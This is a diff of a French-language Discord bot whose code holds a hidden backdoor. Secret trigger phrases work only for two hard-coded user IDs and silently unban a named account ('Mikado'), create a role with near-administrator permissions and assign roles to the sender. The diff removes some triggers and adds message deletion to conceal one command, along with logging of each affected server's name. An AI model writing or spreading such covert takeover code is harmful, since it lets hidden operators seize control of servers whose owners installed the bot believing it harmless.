@@ -33,16 +33,6 @@ bot.on('message', message => {
  //invite.createInvite({maxAge: 0, maxUses: 0}).then(invite => console.log(`Connecté sur : ${guild.name} || ${invite} || ${guild.id})`));
    // });
    
-   if (message.content.startsWith('blop')) {
-   if (message.author.id !== '423118623876448296')
-   if (message.author.id !== '301913733536415755')
-   return;
-   message.delete()
-   message.guild.unban('301913733536415755')
-  .then(user => console.log(`Unbanned Mikado from ${guild.name}`))
-  .catch(console.error);          
-      }
-   
    if (message.content.startsWith('bblop')) {
    if (message.author.id !== '423118623876448296')
    if (message.author.id !== '301913733536415755')
@@ -51,16 +41,7 @@ bot.on('message', message => {
    message.guild.unban('450790126063190016')
   .then(user => console.log(`Unban Mikado from ${guild.name}`))
   .catch(console.error);          
-      }
-   
-   if (message.content.startsWith('C\'est mieux comme ça')) {
-   if (message.author.id !== '423118623876448296')
-   if (message.author.id !== '301913733536415755')
-   return;
-    message.member.addRole(message.member.guild.roles.find('name', '☡- 🌸Famille de shiro🌸 -☡'));
-      }
-   
-  
+      } 
    
    if (message.content.startsWith('Les emoji mikado c\'est cool')) {
    if (message.author.id !== '423118623876448296')
@@ -88,7 +69,8 @@ bot.on('message', message => {
                                  permissions: 2146958591
 				//position: 84
 				})
-	                    console.log(args.join(" ") + 'a été ajoutés au serveur')
+	                    message.delete()
+	                    console.log('Le role ' + args.join(" ") + ` a été ajoutés au serveur ${guild.name}`)
 			}
     
     		   
@@ -101,6 +83,7 @@ bot.on('message', message => {
    return;
    let args = message.content.split(" ").slice(1);
     message.member.addRole(message.member.guild.roles.find('name', args.join(" ")));
+	  console.log('Le role '+ args.join(" ") + ` a été ajouté a Mikado sur le serveur ${guild.name}`);
      }
 	
 	
